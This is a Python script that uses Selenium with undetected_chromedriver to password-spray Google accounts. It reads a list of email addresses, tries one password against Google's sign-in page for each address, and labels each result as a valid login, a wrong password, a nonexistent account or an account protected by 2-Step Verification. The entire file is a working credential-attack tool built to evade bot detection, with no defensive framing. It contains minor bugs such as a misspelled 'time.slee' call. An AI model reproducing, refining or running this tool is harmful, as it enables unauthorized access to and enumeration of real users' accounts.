from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
import undetected_chromedriver as uc
import argparse, time, os, datetime

#chrome_options = Options()
#chrome_options.add_argument("--headless")
#driver = uc.Chrome(options=chrome_options)
driver = uc.Chrome()

def load_emails(email_file):
	'''
	Loads a list of emails from 'email file'

	Args:
		email_file(str): filename of file holding emails

	Returns:
		emails(list): a list of usernames.

	'''
	try:
		with open(email_file) as file_handle:
			return [line.strip() for line in file_handle.readlines()]
	except:
		print("{} is not a file.".format(email_file))
		exit()

def password_options(email, password):
	global driver
	inputElement = driver.find_element(By.NAME,"password")
	inputElement.send_keys(password)

	time.sleep(2)

	inputElement.send_keys(Keys.ENTER)
	inputElement.submit()
	time.sleep(6)
	if bad_response() == True:
		print("[-] 400 FAILED! INVALID LOGIN {}: {}".format(email,password))
		time.sleep(1)
	elif no_account() == True:
		print("[-] 404 FAILED! ACCOUNT DOES NOT EXIST {}: {}".format(email,password))
		time.sleep(1)
	else:
		try:
			driver.find_element(By.XPATH, "//*[contains(text(), 'Welcome, ')]").text.split(", ")[1:]
			print("[+] SUCCESS! 200 VALID LOGIN {}: {}".format(email,password))
			time.sleep(120)
		except:
			driver.find_element(By.XPATH, "//*[contains(text(), '2-Step Verification')]")
			print("[+] SUCCESS! 200 VALID LOGIN - Note: The response indicates MFA (Google) is in use.")
			time.slee(120)

	
def no_account():
	global driver
	try:
		elem = driver.find_element(By.XPATH, "//*[contains(text(), 'Couldn’t find your Google Account')]")
		return True
	except:
		return False

def bad_response():
	global driver
	try:
		elem = driver.find_element(By.XPATH, "//*[contains(text(), 'Wrong password. Try again or click Forgot password to reset it.')]")
		return True
	except:
		return False


def password_spray(email,password):
	global driver

	print("Loading credentials from {} with password {}".format(os.path.basename(args.filename),password))
	start_time = datetime.datetime.utcnow()
	print('Execution started at: {}'.format(start_time))
	for emails in email:
		driver.get("https://accounts.google.com/signin/v2/identifier?service=accountsettings&continue=https%3A%2F%2Fmyaccount.google.com%3Futm_source%3Daccount-marketing-page%26utm_medium%3Dgo-to-account-button&flowName=GlifWebSignIn&flowEntry=ServiceLogin")

		inputElement = driver.find_element(By.ID, "identifierId")
		inputElement.send_keys(emails)

		inputElement.send_keys(Keys.ENTER)
		inputElement.submit()

		time.sleep(5)
		password_options(emails,password)

if __name__ == '__main__':
	parser = argparse.ArgumentParser("python3 gcp_v2.py -u userfile -p 'Password'")
	parser.add_argument('-u', dest='filename', help='Email list you want to spray', type=str)
	parser.add_argument('-p', dest='password', help='Password to use for spraying', type=str)
	args=parser.parse_args()

	password_spray(load_emails(args.filename), args.password)
